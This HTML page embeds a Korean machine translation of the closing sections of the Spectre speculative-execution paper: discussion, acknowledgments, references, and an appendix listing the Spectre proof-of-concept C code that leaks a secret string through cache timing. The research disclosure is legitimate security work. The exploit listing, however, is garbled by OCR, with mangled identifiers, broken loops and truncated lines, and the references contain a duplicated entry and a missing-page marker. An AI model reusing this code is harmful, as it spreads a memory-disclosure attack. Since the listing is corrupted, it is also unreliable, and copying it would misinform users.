      '소프트웨어 격리 기술은 샌드박스, 프로세스 분리, 컨테이너화, 메모리 안전성, 증명 운반 코드를 포함한 다양한 이름으로 매우 널리 배포된다. 이 모든 것을 뒷받침하는 근본적인 보안 가정은 CPU가 안전 검사를 포함하여 소프트웨어를 충실하게 실행할 것이라는 것이다. 투기 실행은 불행히도 적들이 메모리 및 레지스터 콘텐츠의 비밀성(그러나 무결성은 아님)을 위반할 수 있게 하는 방식으로 이러한 가정을 위반한다. 결과적으로 광범위한 소프트웨어 격리 접근법이 영향을 받는다. 또한, 기존의 암호 구현에 대한 캐쉬 공격에 대한 대응책은 투기적 실행으로 인한 영향이 아닌 \'공식적으로\' 실행된 명령어만을 고려하며, 또한 영향을 받는다.\n' +
      '\n' +
      '착취의 실현 가능성은 피해자 CPU 및 소프트웨어의 측면, 피해자와 상호 작용하는 적의 능력을 포함한 여러 요인에 따라 달라진다. 네트워크 기반 공격을 생각할 수 있지만 공격자가 피해자와 동일한 CPU에서 코드를 실행할 수 있는 상황은 주요 위험을 초래한다. 이러한 경우, 착취는 간단할 수 있는 반면, 다른 공격은 레지스터 및 메모리를 할당하는 데 있어 피해자의 컴파일러에 의해 이루어진 선택과 같은 세부 사항에 의존할 수 있다. 퍼징 도구는 현재 소프트웨어의 취약성을 찾기 위해 적대자에 의해 조정될 수 있습니다.\n' +
      '\n' +
      '공격은 현재 문서화되지 않은 하드웨어 효과를 포함하기 때문에 주어진 소프트웨어 프로그램의 활용 가능성은 프로세서마다 다를 수 있다. 예를 들어, 일부 간접 분기 리디렉션 테스트는 스카이라이크에서 작동했지만 해스웰에서는 작동하지 않았다. AMD는 자사의 라이젠 프로세서에 "과거 실행을 기반으로 애플리케이션이 어떤 미래 경로를 취할지를 예측하는 인공 지능 신경망"[3, 5]이 있어 더욱 복잡한 추측 행동을 암시한다고 명시하고 있다. 결과적으로, 이전 섹션에서 설명된 스톱-갭 대응책은 단기적으로 실용적인 활용을 제한하는 데 도움이 될 수 있지만, 현재 특정 코드 구성이 오늘날의 프로세서에 걸쳐 안전한지 또는 안전하지 않은지를 알 수 있는 방법이 없다 - 훨씬 적은 미래의 설계.\n' +
      '\n' +
      '많은 일이 앞에 놓여 있다. 소프트웨어 보안은 근본적으로 어떤 정보 CPU 구현이 계산으로부터 노출되는 것이 허용되는지(허용되지 않음)에 대해 하드웨어와 소프트웨어 개발자 간에 명확한 공통 이해를 갖는 것에 의존한다. 결과적으로, 장기 해결책들은 명령 세트 아키텍처들이 프로세서의 보안 속성들에 대한 명확한 안내를 포함하도록 업데이트될 것을 요구할 것이고, CPU 구현들은 순응하도록 업데이트될 필요가 있을 것이다.\n' +
      '\n' +
      '보다 광범위하게는 보안과 성능 사이에 상충 관계가 있습니다. 본 논문의 취약성과 다른 많은 취약점들은 기술 산업에서 성능 극대화에 대한 오랜 초점에서 비롯된다. 그 결과, 프로세서들, 컴파일러들, 디바이스 드라이버들, 운영 체제들, 및 수많은 다른 중요한 컴포넌트들은 보안 위험들을 도입하는 복잡한 최적화들의 복합 계층들을 진화시켰다. 불안정성의 비용이 증가함에 따라 이러한 설계 선택은 재검토되어야 하며, 많은 경우에 보안에 최적화된 대체 구현이 필요할 것이다.\n' +
      '\n' +
      '## 9 Acknowledgments\n' +
      '\n' +
      '이 작업은 구글 프로젝트 제로(Google Project Zero)의 독자적인 작업과 일부 중복된다.\n' +
      '\n' +
      '우리는 인텔이 명확한 시간표를 전달하고 관련된 모든 연구자들을 연결함으로써 이 문제를 전문적으로 처리해 준 것에 대해 감사드린다. 또한 ARM, 퀄컴 및 기타 공급업체가 이 문제를 공개할 때 신속하게 응답해 주셔서 감사합니다.\n' +
      '\n' +
      '다니엘 그로스, 모리츠 립, 스테판 망가드, 마이클 슈워즈는 유럽 연합의 Horizon 2020 연구 및 혁신 프로그램(무상 협약 번호 681402)에 따라 유럽 연구 위원회(ERC)의 지원을 받았다.\n' +
      '\n' +
      '대니얼 젠킨은 NSF 상 #1514261 및 #1652259, 재정 지원 상 70NANB15H328, 미국 상무부, 국립 표준 기술 연구소, 2017-2018 로스차일드 박사 후 펠로우십 및 계약 #FA8650-16-C-7622에 따른 국방 고등 연구 프로젝트 기관(DARPA)의 지원을 받았다.\n' +
      '\n' +
      '## References\n' +
      '\n' +
      '* [1] Security: Chrome provides high-res timers which allow cache side channel attacks. [https://bugs.chromium.org/p/chromium/issues/detail?id=508166](https://bugs.chromium.org/p/chromium/issues/detail?id=508166).\n' +
      '* [2] Cortex-A9 technical reference manual, Revision r4p1, Section 11.4.1, 2012.\n' +
      '\n' +
      '[MISSING_PAGE_FAIL:13]\n' +
      '\n' +
      '*[36]Yarom, Y., and Falkner, K. FLUSH+RELOAD: 고해상도, 저잡음, L3 캐시 부채널 공격. _USENIX Security Symposium_ (2014), USENIX Association, pp. 719-732에 기재되어 있다.\n' +
      '* [37]Yarom, Y., and Falkner, K. Flush+Reload: 고해상도, 저잡음, L3 캐시 부채널 공격. _USENIX Security Symposium 2014_(2014), USENIX Association, pp. 719-732에 기재되어 있다.\n' +
      '*[38]Yarom, Y., Ge, Q., Liu, F., Lee, R. B., and Heiser, G. Mapping the Intel last-level cache. Cryptology ePrint Archive, Report 2015/905, 2015. [http://eprint.iacr.org/2015/905](http://eprint.iacr.org/2015/905).\n' +
      '\n' +
      '스펙터 예 구현\n' +
      '\n' +
      '```\n' +
      '1#include<<tddio.h>\n' +
      '2#include<stdlib.h>\n' +
      '3#include<stdint.h>\n' +
      '4#ifdef_NSC_VER\n' +
      '5#include<intrin.h> /*forrdtscpandclflush*/\n' +
      '6#pragmaoptimize("gt",on)\n' +
      '7#else\n' +
      '8#include<x86intrin.h> /*forrdtscpandclflush*/\n' +
      '9#endif\n' +
      '10\n' +
      '11/********************************************************************************\n' +
      '12Victimode.\n' +
      '13************************************************/\n' +
      '14unsignedintarray1_size=16;\n' +
      '15uint8_tunused[64];\n' +
      '16uint8_tarray[160]={1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};\n' +
      '17uint8_tunused[264];\n' +
      '18uint8_tarray[256*512];\n' +
      '19\n' +
      '20char*secret="The MagicWordsareSqueamishOssifrage.";\n' +
      '21\n' +
      '22uint8_ttemp=0;/*Usedsocompilerwon\'toptimizeoutvictim_function()*/\n' +
      '23\n' +
      '24voidvictim_function(size_tx){\n' +
      '25if(x<array_size){\n' +
      '26tempk=array2[array1[x]*512];\n' +
      '27}\n' +
      '28}\n' +
      '29\n' +
      '30\n' +
      '31/********************************************************************************\n' +
      '32Analysiscode\n' +
      '33****************************************************************/\n' +
      '34#defineCACHE_HIT_THRESHOLD(80)/*assumecachehitiftime<threshold*/\n' +
      '35\n' +
      '36/*Reportbestguessinvalue[0]andrunner-upinvalue[1]*/\n' +
      '37voidreadMemoryByte(size_tmalicious_x,uint8_tvalue[2],intscore[2]){\n' +
      '38staticintresult[256];\n' +
      '39inttries,i,j,k,mix_i,junk=0;\n' +
      '40size_ttraining_x,x;\n' +
      '41registeruint64_ttime1,time2;\n' +
      '42volatileuint8_t*addr;\n' +
      '43\n' +
      '44for(i=0;i<256;i++)\n' +
      '45results[i]=0;\n' +
      '46for(tries=999;tries>0;tries-){\n' +
      '47\n' +
      '48/*Flusharray2[256*(0..255)]fromcache*/\n' +
      '49for(i=0;i<256;i++)\n' +
      '50__mm_clflush(&array2[i*512]);/*intrinsicforclflushinstruction*/\n' +
      '51\n' +
      '52/*30loops:Strainingruns(z=training_z)perattackrun(z=malicious_z)*/\n' +
      '53training_x=tries%array1_size;\n' +
      '54for(j=29;j=0;j->){\n' +
      '55__mm_clflush(&array1_size);\n' +
      '56for(volatileintz=0;z<100;z++){}/*Delay(canalsomfence)*/\n' +
      '57\n' +
      '58/*Bittwiddlingtosetz=training_zif36=0ormalicious_zif36=0*/\n' +
      '59/*Avoidjumpsincasethosetipoffthebranchpredictor*/\n' +
      '60x=((j%6)-1)&~0xFFFF;/*Setz=FFF.FF000if36=0,elsez=0*/\n' +
      '61x=(x|(x>>16));/*Setz=-1if36=0,elsez=0*/\n' +
      '62x=training_x~(x&(malicious_x~training_x));\n' +
      '63\n' +
      '* Callthevictim!*/ victim_function(x);} /*Timereads.Orderislightmixeduptopreventstrideprediction*/ for(i=0;i<256;i++){ mix_i=((i*167)+13)&255; addr=&array2[mix_i*512]; timel=_rtdecp(&junk);/*READTIMER*/ junk=*addr; /*MEMORYAccessedTOTIME*/ time2=__rdtscp(&junk)-time1;/*READTIMER@COMPUTEELapsedTIME*/ if(time2<=CACHE_HIT_THRESHOLD&&mix_i!= array1[tries%array1_size]) result[mix_i]++;/*cachehit-add+1tscoreforthisvalue*/ } /*Locatehighest@second-highestresultsresultsresultsresultsresinj/k*/ j=k=-1; for(i=0;i<256;i++){ if(j<0|results[i]>=results[j]){ k=i; } elseif(k<0||results[i]>=results[k])||(results[j]==2&&results[k]==0)) break;/*Clearsuccessifbestis>2*runner-up+5or2/0*/ } results[0]"=junk;/*usejunksocodeabovewon\'tgetoptimizedout*/ value[0]=(uint8_t)j; score[0]=results[j]; value[1]=(uint8_t)k; score[1]=results[k];\n' +
      '9}\n' +
      '10intmain(intargc,constchar*argv){ size_tmalicious_x=(size_t)(secret-(char*)array1);/*defaultformalicious_x*/ inti,score[2],len=40; uint8_tvalue[2];\n' +
      '11\n' +
      '12for(i=0;i<sizeof(array2);i++) array2[i]=1;/*writetoarray2soinRAMnotcopy-on-writezeropages*/ if(argc==3){ sscanf(argv[1],%p);(void*)(&malicious_x); malicious_x=(size_t)array1;/*Convertinputvalueinttoapointere*/ sscanf(argv[2],%d\',%len); } printf("Reading%dbytes:\\n",len); while(--len>=0){ printf("Readingat malicious_x=%p...",(void*)malicious_x); readMemoryByte(malicious_x+,value,score); printf("%s:",(score[0]>=2*score[1]?"Success":"Unclear")); printf("0x%02%=%%c\'score=%d ",value[0], (value[0]>31&&value[0\n' +
      '\n' +
      '목록 4: x86에 대한 Spectre 공격을 이용한 데모 판독 메모리.\n' +
      '\n';
  </script>
  <style>
    #content {
      max-width: 800px;
      margin: auto;
    }
  </style>
  <script>
    let script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/npm/mathpix-markdown-it@1.0.40/es5/bundle.js";
    document.head.append(script);

    script.onload = function() {
      const isLoaded = window.loadMathJax();
      if (isLoaded) {
        console.log('Styles loaded!')
      }

      const el = window.document.getElementById('content-text');
      if (el) {
        const options = {
          htmlTags: true
        };
        const html = window.render(text, options);
        el.outerHTML = html;
      }
    };
  </script>
</head>
<body>
  <div id="content"><div id="content-text"></div></div>
</body>
</html>